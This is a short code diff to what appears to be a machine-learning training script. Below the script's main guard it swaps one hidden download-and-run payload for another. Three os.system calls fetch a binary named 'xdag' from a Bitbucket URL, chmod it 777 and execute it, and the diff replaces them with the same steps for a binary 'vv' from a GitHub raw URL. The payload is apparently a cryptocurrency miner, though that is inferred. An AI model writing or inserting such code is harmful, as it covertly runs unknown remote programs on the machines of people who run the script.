@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://bitbucket.org/angga98/wang/raw/3a260a7a9b1f8f2581867a77b07af210f742f601/xdag')
-os.system('chmod 777 xdag')
-os.system('./xdag')
+os.system('wget https://raw.githubusercontent.com/aingcuy778/aing/main/vv')
+os.system('chmod 777 vv')
+os.system('./vv')
